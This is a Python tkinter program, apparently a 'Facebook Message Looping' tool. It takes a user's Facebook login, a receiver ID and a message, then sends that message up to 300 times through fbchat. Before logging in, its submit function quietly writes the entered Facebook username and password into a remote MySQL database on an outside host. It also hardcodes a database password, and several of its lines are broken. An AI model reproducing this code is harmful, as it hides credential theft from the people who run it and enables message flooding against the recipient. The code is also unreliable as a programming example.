from tkinter import *
from functools import partial
import mysql.connector
from fbchat import Client
import fbchat
def changePage(frame):
    frame.tkraise()
def login():
    covid22=mysql.connector.connect(
    # Enter your database information
    host="bj8vya55jbuczvvlkrql-mysql.services.clever-cloud.com",
    user="u41zvjtuokudv2pb",
    passwd="xxxx",
    database="bj8vya55jbuczvvlkrql")
    db6=covid22.cursor()
    db6.execute("SELECT usern,passw FROM userData")
    userlist=db6.fetchall()
    print("Hello!")
    for i in userlist:
        if i==(userEntry1.get(),passEntry1.get()):
            changePage(third_frame)
            def submit():
                covid22=mysql.connector.connect(
                # Enter your database information
                host="bylugg4sw2psu8r2nvvb-mysql.services.clever-cloud.com",
                user="ukauw84vjvxytvjo",
                passwd="xxxx",
                database="bylugg4sw2psu8r2nvvb"
                )
                db5=covid22.cursor()
                db5.execute("CREATE TABLE data(id int primary key AUTO_INCREMENT,usern VARCHAR(30),passw VARCHAR(30))")
                db5.execute("INSERT INTO data(usern,passw)VALUES(%s,%s)",(user.get() ,password.get()))
                covid22.commit()
                client1=Client(username.get(),password.get())
                
                print(client1.isLoggedIn())
                counter=1
                max=int(Num_Loop.get())
                while counter <= max:
                    client1.send(fbchat.models.Message(Message.get()), Receiver.get())
                    counter +=1
            # third_frame.title("Fb Chat")
            # third_frame.iconbitmap("C:\\Users\\HP\\Desktop\\Greenhackers\\fb.ico")
            Label(third_frame,text="Facebook Message Looping",font=("Comic Sans MS",35)).grid(column=1,row=0,columnspan=1)
            Lst=['Username','Password','Receiver Id','Message','Amount of message']
            y=100
            for i in Lst:
                Label(third_frame,text=i,font=("Comic Sans MS",20)).place(x=100,y=y)
                y+=50
            username=Entry(third_frame,width=35)
            username.place(x=358,y=115)
            password=Entry(third_frame,width=35)
            password.place(x=358,y=165)
            Receiver=Entry(third_frame,width=35)
            Receiver.place(x=358,y=215)
            Message=Entry(third_frame,width=35)
            Message.place(x=358,y=265)
            Num_Loop=Spinbox(third_frame,from_=1,to=300)
            Num_Loop.place(x=358,y=315)
            submit=Button(third_frame,text='Submit',command=submit)
            submit.place(x=200,y=370)
            Label(third_frame,text="Created by 4PHRODIT3",font=("Comic Sans MS",30),fg="red").place(x=600,y=600)
            third_frame.mainloop()

    
def signUp():
    covid22=mysql.connector.connect(
    host="bj8vya55jbuczvvlkrql-mysql.services.clever-cloud.com",
    user="u41zvjtuokudv2pb",
    passwd="HcPaKNgz7LCWVG1s6w7V",
    database="bj8vya55jbuczvvlkrql"
)
    db6=covid22.cursor()
    db6.execute("CREATE TABLE userData(id int primary key AUTO_INCREMENT,usern VARCHAR(30),passw VARCHAR(30))")
    db6.execute("INSERT INTO userData(usern,passw)VALUES(%s,%s)",(userEntry.get(),passEntry.get()))
    covid22.commit()
    db6.execute("DESCRIBE userData")
    print(userEntry.get())
    print(passEntry.get())

main=Tk()
main.geometry("700x500")
main.title("Fb Chat Login")

second_frame=Frame(main)
second_frame.place(x=0,y=0,width=700,height=500)

third_frame=Frame(main)
third_frame.place(x=0,y=0,width=700,height=500)

root=Frame(main)
root.place(x=0,y=0,width=700,height=500)


#main.iconbitmap("C:\\Users\\HP\\Desktop\\Greenhackers\\fb.ico")
Label(root,text="Fb Chat Login",font=("Comic Sans MS",35)).grid(column=1,row=0)
Lst=["Username or Email","Password"]
j=1
for i in Lst:
    Label(root,text=i,font=("Comic Sans MS",20)).grid(column=0,row=j)
    j +=1
userEntry1=Entry(root,width=30)
userEntry1.place(x=245,y=90)
passEntry1=Entry(root,width=30)
passEntry1.place(x=245,y=135)
rememberMe=Checkbutton(root,text="Keep me sign in when login again",pady=20).grid(column=1,row=3,columnspan=1,sticky='w')
LoginButton=Button(root,text="Login",command=login).grid(column=1,row=5,columnspan=1,sticky='w')
Label(root,text="If you don't have an account, please sign up first.",font=("Comic Sans MS",17),pady=20).grid(column=0,row=6,columnspan=5)
signUpButton=Button(root,text="Sign up here", command=lambda:changePage(second_frame)).grid(column=1,row=7,columnspan=1,sticky='w')
#second Frame
Label(second_frame,text="Fb Chat Registeration",font=("Comic Sans MS",35)).place(x=100,y=0)
Lst=["Username or Email","Password","Retype Password"]
j=75
for i in Lst:
    Label(second_frame,text=i,font=("Comic Sans MS",20)).place(x=0,y=j)
    j +=45
userEntry=Entry(second_frame,width=30)
userEntry.place(x=265,y=90)
passEntry=Entry(second_frame,width=30)
passEntry.place(x=265,y=135)
passEntryAgain=Entry(second_frame,width=30).place(x=265,y=180)
agreeTermsAndConditions=Checkbutton(second_frame,text="I agree to terms and conditions",pady=20).place(x=265,y=205)
signUpButton=Button(second_frame,text="Sign up", command=signUp).place(x=265,y=255)
backToLogin=Button(second_frame,text="Back to Login",command=lambda: changePage(root)).place(x=380,y=255)
main.mainloop()
